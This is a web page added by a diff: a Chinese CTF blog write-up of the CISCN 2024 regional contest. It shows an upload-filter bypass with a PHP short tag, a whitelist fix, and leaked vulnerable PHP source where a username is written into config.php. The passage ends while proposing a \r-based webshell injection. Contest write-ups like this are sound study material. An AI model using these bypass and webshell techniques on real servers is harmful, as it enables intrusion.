@@ -1,0 +1,655 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"sun-zzz.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":200,"display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="记录我福师大热情的篮球场">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CISCN2024 华东南赛区">
+<meta property="og:url" content="https://sun-zzz.github.io/article/2024CISCN-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA.html">
+<meta property="og:site_name" content="rev1ve&#39;s blog">
+<meta property="og:description" content="记录我福师大热情的篮球场">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sun-zzz.github.io/article/2024CISCN-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623091443579.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/2024CISCN-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623091428121.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/2024CISCN-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240706103833600.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/2024CISCN-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240706104121502.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/2024CISCN-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623115809810.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/2024CISCN-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240706105234987.png">
+<meta property="og:image" content="https://sun-zzz.github.io/article/2024CISCN-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240706112821088.png">
+<meta property="article:published_time" content="2024-06-23T12:49:08.000Z">
+<meta property="article:modified_time" content="2024-07-06T13:54:09.472Z">
+<meta property="article:author" content="rev1ve">
+<meta property="article:tag" content="原型链污染">
+<meta property="article:tag" content="线下赛">
+<meta property="article:tag" content="CISCN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sun-zzz.github.io/article/2024CISCN-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623091443579.png">
+
+<link rel="canonical" href="https://sun-zzz.github.io/article/2024CISCN-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>CISCN2024 华东南赛区 | rev1ve's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">rev1ve's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links" rel="section"><i class="fas fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://sun-zzz.github.io/article/2024CISCN-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="rev1ve">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="rev1ve's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CISCN2024 华东南赛区
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-06-23 20:49:08" itemprop="dateCreated datePublished" datetime="2024-06-23T20:49:08+08:00">2024-06-23</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-07-06 21:54:09" itemprop="dateModified" datetime="2024-07-06T21:54:09+08:00">2024-07-06</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF%E6%AF%94%E8%B5%9B/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/article/2024CISCN-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA.html" class="post-meta-item leancloud_visitors" data-flag-title="CISCN2024 华东南赛区" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/article/2024CISCN-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/article/2024CISCN-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>记录我福师大热情的篮球场</p>
+<span id="more"></span>
+
+<h1 id="CISCN2024-华东南赛区"><a href="#CISCN2024-华东南赛区" class="headerlink" title="CISCN2024 华东南赛区"></a>CISCN2024 华东南赛区</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>倒一身份进入华东南分区赛！！比赛前一天准备蛮多东西，一晚上在本地搭建ai模型，又下载一堆工具，对我来说真的蛮紧张的。不过还好超常发挥，做三道web直直直直直接打到15名。后面fix除了那道原型链污染可惜之外，其他拿源码也修不明白呜呜呜。总的来说除了比赛场地非常热之外，分区赛体验感还不错。</p>
+<hr>
+<h2 id="submit"><a href="#submit" class="headerlink" title="submit"></a>submit</h2><h3 id="BREAK"><a href="#BREAK" class="headerlink" title="BREAK"></a>BREAK</h3><p>文件上传功能</p>
+<p>有对php字符进行检测，<code>&lt;=</code>直接绕过</p>
+<p><img src="/article/2024CISCN-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623091443579.png"></p>
+<p>访问文件上传路径，得到flag</p>
+<p><img src="/article/2024CISCN-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623091428121.png"></p>
+<h3 id="FIX"><a href="#FIX" class="headerlink" title="FIX"></a>FIX</h3><p>由于题目要求是png图片，直接加个白名单检测</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$allowedExtensions = array(&quot;png&quot;);</span><br><span class="line">$extension = pathinfo($_FILES[&#x27;myfile&#x27;][&#x27;name&#x27;], PATHINFO_EXTENSION);</span><br><span class="line">// 检查文件类型是否允许上传</span><br><span class="line">if (!in_array(strtolower($extension), $allowedExtensions)) &#123;</span><br><span class="line">    echo &quot;只允许上传png&quot;;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最终将upload.php替换就行，不需要重启服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// $path = &quot;./uploads&quot;;</span><br><span class="line">error_reporting(0);</span><br><span class="line">$path = &quot;./uploads&quot;;</span><br><span class="line">$content = file_get_contents($_FILES[&#x27;myfile&#x27;][&#x27;tmp_name&#x27;]);</span><br><span class="line">$allow_content_type = array(&quot;image/png&quot;);</span><br><span class="line">$type = $_FILES[&quot;myfile&quot;][&quot;type&quot;];</span><br><span class="line"></span><br><span class="line">//修复部分</span><br><span class="line">$allowedExtensions = array(&quot;png&quot;);</span><br><span class="line">$extension = pathinfo($_FILES[&#x27;myfile&#x27;][&#x27;name&#x27;], PATHINFO_EXTENSION);</span><br><span class="line">// 检查文件类型是否允许上传</span><br><span class="line">if (!in_array(strtolower($extension), $allowedExtensions)) &#123;</span><br><span class="line">    echo &quot;只允许上传png&quot;;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line">//</span><br><span class="line">if (!in_array($type, $allow_content_type)) &#123;</span><br><span class="line">    die(&quot;只允许png哦!&lt;br&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (preg_match(&#x27;/(php|script|xml|user|htaccess)/i&#x27;, $content)) &#123;</span><br><span class="line">    // echo &quot;匹配成功!&quot;;</span><br><span class="line">    die(&#x27;鼠鼠说你的内容不符合哦0-0&#x27;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $file = $path . &#x27;/&#x27; . $_FILES[&#x27;myfile&#x27;][&#x27;name&#x27;];</span><br><span class="line">echo $file;</span><br><span class="line"></span><br><span class="line">if (move_uploaded_file($_FILES[&#x27;myfile&#x27;][&#x27;tmp_name&#x27;], $file)) &#123;</span><br><span class="line">        file_put_contents($file, $content);</span><br><span class="line">        echo &#x27;Success!&lt;br&gt;&#x27;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">        echo &#x27;Error!&lt;br&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!----&gt;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="粗心的程序员"><a href="#粗心的程序员" class="headerlink" title="粗心的程序员"></a>粗心的程序员</h2><h3 id="BREAK-1"><a href="#BREAK-1" class="headerlink" title="BREAK"></a>BREAK</h3><p>扫描目录存在<a target="_blank" rel="noopener" href="http://www.zip源码泄露/">www.zip源码泄露</a></p>
+<p>随便注册一个用户登录，注意到是用户修改名字的功能</p>
+<p>我们审一下代码</p>
+<p><strong>edit.php</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;default_info_auto_recovery.php&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CheckNewUser</span>(<span class="params"><span class="variable">$username</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>) &lt;<span class="number">5</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>) &gt; <span class="number">20</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;新用户名长度必须大于等于5或者小于等于10!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ok&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$id</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;NO ACCESS!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$newusername</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;newusername&#x27;</span>];</span><br><span class="line"><span class="variable">$info</span> = <span class="title function_ invoke__">CheckNewUser</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$newusername</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$info</span> != <span class="string">&quot;ok&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$info</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM user WHERE username = ?&quot;</span>;</span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindValue</span>(<span class="number">1</span>,<span class="variable">$newusername</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetchAll</span>(PDO::<span class="variable constant_">FETCH_ASSOC</span>);</span><br><span class="line"><span class="variable">$cont</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$result</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$cont</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;该用户已存在!&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE user SET username= ? where id=?&quot;</span>;</span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindValue</span>(<span class="number">1</span>,<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$newusername</span>,ENT_QUOTES));</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindValue</span>(<span class="number">2</span>,<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$id</span>,ENT_QUOTES));</span><br><span class="line"><span class="variable">$status</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$status</span>)&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$newusername</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;修改成功!&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;修改失败!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>edit.php主要就是接收POST参数的新用户名，然后对数据库进行操作，最后写入session的username。不过这里有<code>bindValue()</code>和<code>htmlspecialchars()</code>，那么很明显不存在sql注入</p>
+<p>我们再看看<strong>home.php</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;default_info_auto_recovery.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$p</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>]?:<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\?|php|:/i&quot;</span>,<span class="variable">$p</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d h:i:s&#x27;</span>, <span class="title function_ invoke__">time</span>());</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$username</span> &amp;&amp; <span class="variable">$id</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hello,&quot;</span>.<span class="string">&quot;<span class="subst">$username</span>&quot;</span>;</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;//登陆时间<span class="subst">$time</span>,<span class="subst">$username</span> <span class="subst">$p</span>&quot;</span>;</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;config.php&quot;</span>,<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;config.php&quot;</span>).<span class="variable">$str</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;NO ACCESS&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span> src=<span class="string">&quot;js/jquery-1.9.0.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span> src=<span class="string">&quot;js/jquery.base64.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">submitData</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> obj = <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">        obj.name = $(<span class="string">&#x27;#newusername&#x27;</span>).<span class="title function_ invoke__">val</span>();</span><br><span class="line">        <span class="keyword">var</span> str = $.base64.<span class="title function_ invoke__">encode</span>(JSON.<span class="title function_ invoke__">stringify</span>(obj.name).<span class="title function_ invoke__">replace</span>(<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;&quot;</span>).<span class="title function_ invoke__">replace</span>(<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;&quot;</span>));</span><br><span class="line">        $.<span class="title function_ invoke__">post</span>(<span class="string">&quot;edit.php&quot;</span>,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">newusername</span>: str</span><br><span class="line">            &#125;,</span><br><span class="line">            function(str)&#123;</span><br><span class="line">                <span class="title function_ invoke__">alert</span>(str);</span><br><span class="line">                location.<span class="title function_ invoke__">reload</span>()</span><br><span class="line">            &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    jQuery.base64 = (<span class="function"><span class="keyword">function</span>(<span class="params">$</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> keyStr = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">utf8Encode</span>(<span class="params"><span class="keyword">string</span></span>) </span>&#123;</span><br><span class="line">            <span class="comment">//省略加密部分</span></span><br><span class="line">            <span class="keyword">return</span> utftext;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">		   <span class="comment">//省略加密部分</span></span><br><span class="line">            <span class="keyword">return</span> output;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            encode: <span class="function"><span class="keyword">function</span> (<span class="params">str</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">encode</span>(str);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">    &#125;(jQuery));</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line">更改用户名&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;newusername&quot;</span> id=<span class="string">&quot;newusername&quot;</span> value=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">&lt;button type=<span class="string">&quot;submit&quot;</span> onclick=<span class="string">&quot;submitData()&quot;</span> &gt;更改&lt;/button&gt;</span><br></pre></td></tr></table></figure>
+
+<p>注意到存在<code>file_put_contents()</code>函数，往前推发现变量str就是session中的username</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(&quot;config.php&quot;,file_get_contents(&quot;config.php&quot;).$str);</span><br></pre></td></tr></table></figure>
+
+<p><code>$str = &quot;//登陆时间$time,$username $p&quot;;</code>是由三部分拼接的，并且过滤了换行<code>\n</code></p>
+<p>我们可以尝试写马，使用<code>\r</code>绕过换行（这里可以不用<code>&lt;&gt;</code>标签，直接eval）</p>
